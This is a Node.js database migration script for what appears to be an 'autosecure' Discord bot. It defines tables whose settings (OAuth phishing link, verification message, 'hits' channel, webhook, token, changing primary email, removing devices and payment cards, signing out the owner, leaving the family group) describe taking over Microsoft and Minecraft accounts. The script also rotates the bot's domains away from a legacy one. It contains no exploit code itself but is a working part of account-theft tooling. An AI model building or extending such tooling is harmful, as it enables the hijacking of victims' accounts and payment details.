/**
 * Migration script: Ensure clean schema without legacy thapcamstore.click
 * and migrate all domain records to 'Rotate (4 Domains)'.
 */

const { queryParams } = require("../db/database.js");
const config = require("../config.json");

async function main() {
    console.log(`[MIGRATION] Starting domain and schema migration...`);

    const defaultPfp = String(config.defaultpfp || '').replace(/'/g, "''");
    const defaultDomain = "Rotate (4 Domains)";

    try {
        // Recreate clean secureconfig table with Rotate (4 Domains) default
        await queryParams(`CREATE TABLE IF NOT EXISTS secureconfig(
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id TEXT,
            exploit INTEGER DEFAULT 1,
            auto_secure INTEGER DEFAULT 1,
            change_ign INTEGER DEFAULT 0,
            multiplayer INTEGER DEFAULT 0,
            oauthapps INTEGER DEFAULT 1,
            removedevices INTEGER DEFAULT 1,
            changegamertag INTEGER DEFAULT 0,
            signout INTEGER DEFAULT 1,
            autoquarantine INTEGER DEFAULT 0,
            checkban INTEGER DEFAULT 0,
            changeprimary INTEGER DEFAULT 1,
            secureifnomc INTEGER DEFAULT 1,
            addzyger INTEGER DEFAULT 1,
            subscribemail INTEGER DEFAULT 0,
            changedob INTEGER DEFAULT 0,
            changename INTEGER DEFAULT 0,
            changepfp INTEGER DEFAULT 0,
            changelanguage INTEGER DEFAULT 0,
            removelinkednumbers INTEGER DEFAULT 1,
            changeskin INTEGER DEFAULT 0,
            skinurl TEXT,
            removecards INTEGER DEFAULT 1,
            leavefamily INTEGER DEFAULT 1,
            language TEXT,
            prefix TEXT DEFAULT "HachiiroMC",
            dob TEXT,
            pfp TEXT DEFAULT '',
            domain TEXT DEFAULT 'Rotate (4 Domains)'
        )`);
        console.log(`[MIGRATION] secureconfig table verified.`);

        // Recreate clean autosecure table with Rotate (4 Domains) default
        await queryParams(`CREATE TABLE IF NOT EXISTS autosecure (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            botnumber INTEGER DEFAULT 1,
            lastsavedname TEXT,
            postserver TEXT,
            creationdate INTEGER,
            server_id TEXT,
            token TEXT,
            user_id TEXT,
            prefix TEXT DEFAULT "HachiiroMC",
            aftersecure TEXT DEFAULT 'nothing',
            blacklistemails INTEGER DEFAULT 1,
            ping TEXT DEFAULT '@everyone',
            exploit INTEGER DEFAULT 1,
            webhook TEXT,
            auto_secure INTEGER DEFAULT 1,
            change_ign INTEGER DEFAULT 0,
            multiplayer INTEGER DEFAULT 0,
            oauthapps INTEGER DEFAULT 1,
            removedevices INTEGER DEFAULT 1,
            changegamertag INTEGER DEFAULT 0,
            signout INTEGER DEFAULT 1,
            autoquarantine INTEGER DEFAULT 0,
            checkban INTEGER DEFAULT 0,
            claiming INTEGER DEFAULT 0,
            changeprimary INTEGER DEFAULT 1,
            changedob INTEGER DEFAULT 0,
            changename INTEGER DEFAULT 0,
            changepfp INTEGER DEFAULT 0,
            changelanguage INTEGER DEFAULT 0,
            secureifnomc INTEGER DEFAULT 1,
            addzyger INTEGER DEFAULT 1,
            subscribemail INTEGER DEFAULT 0,
            validateusername INTEGER DEFAULT 1,
            dob TEXT,
            name TEXT,
            pfp TEXT DEFAULT '',
            language TEXT,
            verifymsg TEXT,
            oauth_link TEXT,
            logs_channel TEXT,
            notification_channel TEXT,
            hits_channel TEXT,
            users_channel TEXT,
            activity TEXT,
            domain TEXT DEFAULT 'Rotate (4 Domains)',
            verification_type NUMBER DEFAULT 0,
            changeskin INTEGER DEFAULT 0,
            skinurl TEXT,
            checkban_hypixel INTEGER DEFAULT 0,
            checkban_donut INTEGER DEFAULT 0,
            removecards INTEGER DEFAULT 0,
            removesubs INTEGER DEFAULT 0,
            removelinkednumbers INTEGER DEFAULT 1,
            leavefamily INTEGER DEFAULT 1,
            note TEXT
        )`);
        console.log(`[MIGRATION] autosecure table verified.`);

        // Update any existing rows containing thapcamstore or null
        await queryParams(
            `UPDATE autosecure SET domain = ? WHERE domain LIKE '%thapcamstore%' OR domain IS NULL OR domain = ''`,
            [defaultDomain]
        );
        await queryParams(
            `UPDATE secureconfig SET domain = ? WHERE domain LIKE '%thapcamstore%' OR domain IS NULL OR domain = ''`,
            [defaultDomain]
        );

        console.log(`[MIGRATION] All domain records and tables updated to Rotate (4 Domains)!`);
        process.exit(0);
    } catch (err) {
        console.error(`[MIGRATION] Error:`, err);
        process.exit(1);
    }
}

main();
